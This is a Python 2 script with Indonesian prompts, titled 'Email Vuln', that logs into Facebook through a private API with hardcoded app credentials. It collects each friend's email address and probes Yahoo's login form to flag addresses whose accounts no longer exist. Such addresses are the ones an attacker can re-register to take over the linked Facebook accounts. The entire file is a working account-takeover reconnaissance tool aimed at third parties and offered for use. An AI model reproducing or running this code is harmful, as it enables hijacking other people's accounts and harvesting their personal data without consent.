import requests, json, os, re, sys, mechanize, urllib
reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
os.system('clear')
print '\x1b[1;36m===================================================='
os.system('figlet -f slant Email Vuln')
print '===================================================='
os.system('sleep 2')
print '\x1b[39m[\x1b[31m*\x1b[39m] HARAP CONNECTION HIDUP \x1b[39m[\x1b[31m*\x1b[39m]'
os.system('sleep 2')
print '\x1b[39m[\x1b[31m*\x1b[39m] LOGIN FB DULU BOS      \x1b[39m[\x1b[31m*\x1b[39m]'
idt = raw_input('\x1b[39m[\x1b[31m*\x1b[39m] Email   : ')
passw = raw_input('\x1b[39m[\x1b[31m*\x1b[39m] Password: ')
url = 'https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + idt + '&locale=en_US&password=' + passw + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6'
data = urllib.urlopen(url)
op = json.load(data)
if 'access_token' in op:
    token = op['access_token']
    print '\x1b[39m[\x1b[31m+\x1b[39m] LOGIN BERHASIL \x1b[39m[\x1b[31m+\x1b[39m]'
else:
    print '\x1b[39m[\x1b[31m+\x1b[39m] \x1b[31mLOGIN VAILED \x1b[39m[\x1b[31m+\x1b[39m]'
    sys.exit()
get_friends = requests.get('https://graph.facebook.com/me/friends?access_token=' + token)
hasil = json.loads(get_friends.text)
print '\x1b[39m[\x1b[31m+\x1b[39m] Berhasil Mendapatkan ID Teman...'

def defense():
    global h
    global o
    o = []
    h = 0
    print '\x1b[36m' + 55 * '-'
    print '\x1b[36m| ' + '           ' + '\x1b[35mEmail' + '              ' + '\x1b[36m|' + '         ' + '\x1b[33mVuln' + '        ' + '\x1b[36m|'
    print 55 * '-'
    for i in hasil['data']:
        wrna = '\x1b[36m'
        wrne = '\x1b[39m'
        h += 1
        o.append(h)
        x = requests.get('https://graph.facebook.com/' + i['id'] + '?access_token=' + token)
        z = json.loads(x.text)
        try:
            kunci = re.compile('@.*')
            cari = kunci.search(z['email']).group()
            if 'yahoo.com' in cari:
                br.open('https://login.yahoo.com/config/login?.src=fpctx&.intl=id&.lang=id-ID&.done=https://id.yahoo.com')
                br._factory.is_html = True
                br.select_form(nr=0)
                br['username'] = z['email']
                j = br.submit().read()
                Zen = re.compile('"messages.ERROR_INVALID_USERNAME">.*')
                try:
                    cd = Zen.search(j).group()
                except:
                    vuln = '      \x1b[31mNot Vuln'
                    lean = 30 - len(z['email'])
                    eml = lean * ' '
                    lone = 24 - len(vuln)
                    namel = lone * ' '
                    print '\x1b[36m| ' + wrna + z['email'] + eml + '\x1b[36m| ' + wrne + vuln + namel + ' \x1b[36m|'
                    continue

                if '"messages.ERROR_INVALID_USERNAME">' in cd:
                    vuln = '        \x1b[32mVuln'
                else:
                    vuln = '     \x1b[31mNot Vuln'
                lean = 30 - len(z['email'])
                eml = lean * ' '
                lone = 24 - len(vuln)
                namel = lone * ' '
                print '\x1b[36m| ' + wrna + z['email'] + eml + '\x1b[36m| ' + wrne + vuln + namel + ' \x1b[36m|'
        except KeyError:
            pass

defense()
